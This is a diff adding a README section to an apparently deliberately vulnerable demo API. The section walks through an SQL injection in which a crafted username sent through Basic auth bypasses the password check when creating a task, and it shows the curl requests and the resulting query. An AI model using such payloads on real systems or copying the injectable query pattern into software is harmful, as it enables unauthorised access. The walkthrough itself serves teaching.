@@ -118,3 +118,59 @@ docker-compose build
 ```shell
 docker-compose up
 ```
+
+## Example SQL-injection
+
+---
+
+### Create new user -> qwerty:qwerty 
+
+```shell
+curl -u admin:admin --location 'http://127.0.0.1:45222/api/v1/manage/user' \
+--header 'Content-Type: application/json' \
+--data '{
+    "username": "qwerty",
+    "password": "qwerty"
+}'
+```
+
+### Create task with injection
+
+USERNAME - **qwerty'), false, 'title', now(), now()) -- '**
+
+PASSWORD - **any**
+
+```shell
+curl --location 'http://127.0.0.1:45222/api/v1/task/create-task-injection' \
+--header 'Authorization: Basic cXdlcnR5JyksIGZhbHNlLCAnU1FMLWlJTkpFQ1RJT04nLCBub3coKSwgbm93KCkpIC0tICc6YW55' \
+--header 'Content-Type: application/json' \
+--data '{
+    "title": "SQL INJECTION"
+}'
+```
+
+#### Response - Internal Server Error(500)
+
+```json
+{
+    "type": "INTERNAL",
+    "comment": "create task"
+}
+```
+
+#### But the task has been created. Because the request to the database:
+
+```sql
+INSERT INTO
+    task(user_id, status, title, created, updated)
+VALUES
+    ((SELECT user_id FROM auth WHERE username = 'qwerty'), false, 'SQL-iINJECTION', now(), now()) -- '' AND password = 'df69d4a3aa4eca782c7cb526841c7e60fb6015806c2ef41df95bfa1afe8427a6'), false, 'SQL INJECTION', now(), now()) RETURNING  task_id  
+```
+
+#### DB rows
+
+![Example SQL-injection](docs/sql-injection.png)
+
+
+
+
